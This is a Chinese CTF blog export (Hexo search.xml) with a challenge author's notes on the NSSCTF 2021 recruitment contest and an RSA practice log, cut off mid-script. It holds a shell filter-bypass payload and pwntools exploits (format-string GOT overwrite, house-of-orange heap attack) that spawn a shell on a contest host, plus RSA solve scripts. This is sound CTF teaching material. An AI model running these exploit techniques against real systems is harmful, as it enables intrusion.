<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NSSCTF 2021 招新出题笔记</title>
    <url>/2021/10/06/NSSCTF%202021%20%E6%8B%9B%E6%96%B0%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/27.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第二次为团队招新赛出题，这次一开始听xenny老板说要搞个校外赛道，好家伙，这次招新四舍五入就成了一个小型的公开赛了，当时正在套模板题的手微微颤抖，有那么一瞬间在想要不要整点活，但想到这比赛是面向新生的最终还是没有整（主要还是菜，整不出来）</p>
<p>这次的题目我负责的是pwn1-5,以及密码学方向的1-5（现代密码部分）, 本来一开始的时候是没有打算出pwn题的，因为新生大部分都是还没有接触过CTF的小白，我觉得新生通过自学把环境搭建好就差不多了，最终还是迫于wdljt老板的淫威出了五个白给pwn。</p>
<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>团队里面搞现代密码的就两个人，另外一个师傅要加班出misc，现代密码就只有我来，又因为赶着第二天上题，就直接摆烂水了5个题</p>
<p>这五个密码题都是模板题，改都不带改的，这五个密码题出题加起来也就花了不到20分钟，难度都不大，每个题应该都能百度到原题。</p>
<h4 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h4><p>给了c1,c2,n，以及e1<em>e2 = 3087,又因为3087 = 3</em>3<em>3</em>7*7 大概率想到模不互素，解题脚本如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:</span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c,e,n)</span><br><span class="line">        <span class="keyword">if</span> m1:</span><br><span class="line">            flag=long_to_bytes(<span class="built_in">int</span>(m1))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h4 id="crypro2"><a href="#crypro2" class="headerlink" title="crypro2"></a>crypro2</h4><p>简单的共模攻击</p>
<h4 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h4><p>，<br>这个题是去年xenny老板在电话里考过我的一个题，当时没有想出来，这次想起来这个题就出到了招新赛里，出完之后审题的时候才发现自己不会做xs，还是太菜。后来<a href="https://space.bilibili.com/317479700?from=search&amp;seid=4162979929301748482&amp;spm_id_from=333.337.0.0">风二西</a>师傅给我说是NPUCTF2020的原题，这才去学了一波。<br>这里就直接贴一下大佬的博客：<a href="https://www.cnblogs.com/vict0r/p/13292511.html">https://www.cnblogs.com/vict0r/p/13292511.html</a><br>解题脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1=flag1</span><br><span class="line">c2=flag2</span><br><span class="line">a = c1+c2</span><br><span class="line">b = c1*c2</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt;=Zmod(n)[]</span><br><span class="line">f = x^<span class="number">2</span> - a*x +b</span><br><span class="line">f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h4><p>由于q = nextPrime(p) , 所以可以yafu直接分解n , 直接拿下</p>
<h4 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h4><p>低e , e = 3</p>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>过滤了一般拿来读文件的一些命令以及空格</p>
<p>payload<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tac$IFS<span class="variable">$9flag</span></span><br></pre></td></tr></table></figure></p>
<h4 id="pwn2-4"><a href="#pwn2-4" class="headerlink" title="pwn2~4"></a>pwn2~4</h4><p>这三个题都是《CTF从0到1》上的模板，直接照着打就行<br>pwn2：修改返回地址为gift<br>pwn3：puts泄露libc地址，ret2libc<br>pwn4: 由于开了pie,格式化字符串泄露程序地址和libc地址，然后再利用格式化字符串任意地址写</p>
<p>关于pwn4在测的时候发现了一个有意思的现象<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwn4&#x27;</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%17$p%21$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = elf_base+elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>用这个exp可以拿到一个sh的shell,但不是每一次都能成功，由于成功率太低，也没有动态调试，希望有知道原因的大佬可以为我解惑。磕头啦，砰砰砰。<br><img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h4 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h4><p>这个题前段时间学house of orange学到的一个题，然后套了个base64编译码表的验证。</p>
<p>利用格式化字符串泄露地址，然后利用gets溢出修改top chunk大小，申请超过top chunk大小的块得到unsortedbin,最后伪造_IO_FILE结构体，修改虚表指针来get shell</p>
<p>exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28062</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;username = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&#123;b@se_xx_64&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x18&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x1000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%9$p%3$p&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attch(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x21010</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xf73c0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x508</span>)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">add(<span class="number">0x400</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>后来看师傅们的讨论，才发现我被非预期了，有的师傅找地方打的rop,有的师傅打把栈迁移到堆上，还有师调 malloc realloc调通了， 果然我还是太菜了。给各位pwn👴磕头🌶，砰砰砰<br><img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>虽然，这次校外赛道被打的很惨，但是校内的人基本上没人做pwn，希望不要把新人劝退吧，要是再没人学pwn,队里pwn方向就真只能摆烂了，出去国赛看别人的队一个队3个pwn👴，而现在队里就只有我一个人搞pwn真的顶不住，希望这次招新能吸收些新鲜的血液吧。也希望团队能越高越好。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF crypto 刷题记录(持续更新)</title>
    <url>/2021/10/08/NSSCTF%20crypto%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/28.jpg" alt="pic"></p>
<span id="more"></span>
<p>这是一个记录在NSSCTF平台上刷crypto题的博客，题目顺序按照刷题的先后顺序</p>
<h2 id="羊城杯-2021-Bigrsa"><a class="header-anchor" href="#羊城杯-2021-Bigrsa">¶</a>[羊城杯 2021]Bigrsa</h2>
<h3 id="题目"><a class="header-anchor" href="#题目">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h3>
<p>n1 和 n2 存在公因数</p>
<h3 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c = pow(m, e, n1)</span></span><br><span class="line"><span class="comment">#c = pow(c, e, n2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line"></span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line"></span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e,phi1)</span><br><span class="line">d2 = invert(e,phi2)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-happy"><a class="header-anchor" href="#SWPU-2020-happy">¶</a>[SWPU 2020]happy</h2>
<h3 id="题目-v2"><a class="header-anchor" href="#题目-v2">¶</a>题目</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)</span><br><span class="line">(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)</span><br><span class="line">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span><br><span class="line">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span><br></pre></td></tr></table></figure>
<h3 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h3>
<p>$hint1 = q + qp^3 = (1+p^3)q = q(1+p)(p^2-p+1)$<br>
$hint2 = qp + qp^2 = q(1+p)p$<br>
gcd(hint1,hint2) = q(1+p)<br>
p = hint2 / q(1+p)</p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e=<span class="number">0x872a335</span></span><br><span class="line"><span class="comment">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line"><span class="comment">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">hint2 = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line">gift = gcd(hint1,hint2)</span><br><span class="line"></span><br><span class="line">p = hint2//gift</span><br><span class="line">q = gift // (p+<span class="number">1</span>)</span><br><span class="line">n= p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = invert(e,phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="鹤城杯-2021-A-CRYPTO"><a class="header-anchor" href="#鹤城杯-2021-A-CRYPTO">¶</a>[鹤城杯 2021]A_CRYPTO</h2>
<h3 id="题目-v3"><a class="header-anchor" href="#题目-v3">¶</a>题目</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4O52594551344P55494R4P48553353424O4234474O33544S4S42545549574O554O4649474S364O324N5N4P5555594P4P4N564456513554534R563244474Q4N554R4533554S53544N4R4Q5957365443534N4Q3458534Q4O584O56515736323248</span><br></pre></td></tr></table></figure>
<h3 id="题解"><a class="header-anchor" href="#题解">¶</a>题解</h3>
<p>ciphey 一把梭<br>
ROT13-&gt;base16-&gt;base32-&gt;base64-&gt;base85</p>
<p>flag:NSSCTF{W0w_y0u_c4n_rea11y_enc0d1ng!}</p>
<h2 id="鹤城杯-2021-easy-crypto"><a class="header-anchor" href="#鹤城杯-2021-easy-crypto">¶</a>[鹤城杯 2021]easy_crypto</h2>
<h3 id="题目-v4"><a class="header-anchor" href="#题目-v4">¶</a>题目</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐</span><br></pre></td></tr></table></figure>
<h3 id="题解-v2"><a class="header-anchor" href="#题解-v2">¶</a>题解</h3>
<p>社会主义核心价值观密码</p>
<p>地址：<a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a></p>
<h2 id="RoarCTF-2019-babyRSA"><a class="header-anchor" href="#RoarCTF-2019-babyRSA">¶</a>[RoarCTF 2019]babyRSA</h2>
<h3 id="题目-v5"><a class="header-anchor" href="#题目-v5">¶</a>题目</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sympy</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def myGetPrime():</span><br><span class="line">    A= getPrime(513)</span><br><span class="line">    print(A)</span><br><span class="line">    B=A-random.randint(1e3,1e5)</span><br><span class="line">    print(B)</span><br><span class="line">    return sympy.nextPrime((B!)%A)</span><br><span class="line">p=myGetPrime()</span><br><span class="line">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="line">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="line">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><span class="line">c=pow(flag,e,n)</span><br><span class="line">#e=0x1001</span><br><span class="line">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="line">#so,what is the flag?</span><br></pre></td></tr></table></figure>
<h3 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h3>
<p>利用威尔逊定理： 当p为素数时$(p-1)\equiv-1(mod p)$<br>
推导：<br>
<img src="http://static.zybuluo.com/hgggg/4n1v84bvw38qojece68x80ly/IMG20211012123645.jpg" alt="IMG20211012123645.jpg-3324.9kB"></p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596a</span><br><span class="line"></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">c=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">A,B</span>):</span></span><br><span class="line">    ans=<span class="number">1</span></span><br><span class="line">    a=-<span class="number">1</span>%A</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B+<span class="number">1</span>,A):</span><br><span class="line">        ans=(ans*invert(i,A))%A</span><br><span class="line">    <span class="keyword">return</span> next_prime((ans*a)%A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = de(A1,B1)</span><br><span class="line">q = de(A2,B2)</span><br><span class="line"></span><br><span class="line">r = n // p // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="鹤城杯-2021-Crazy-Rsa-Tech"><a class="header-anchor" href="#鹤城杯-2021-Crazy-Rsa-Tech">¶</a>[鹤城杯 2021]Crazy_Rsa_Tech</h2>
<h3 id="题目-v6"><a class="header-anchor" href="#题目-v6">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FLAG = bytes_to_long(pad(<span class="string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="number">64</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_key</span>():</span></span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">9</span></span><br><span class="line">    <span class="keyword">while</span>(GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>),e)!=<span class="number">1</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n,e,d</span><br><span class="line"></span><br><span class="line">n_list=<span class="built_in">list</span>()</span><br><span class="line">c_list=<span class="built_in">list</span>()</span><br><span 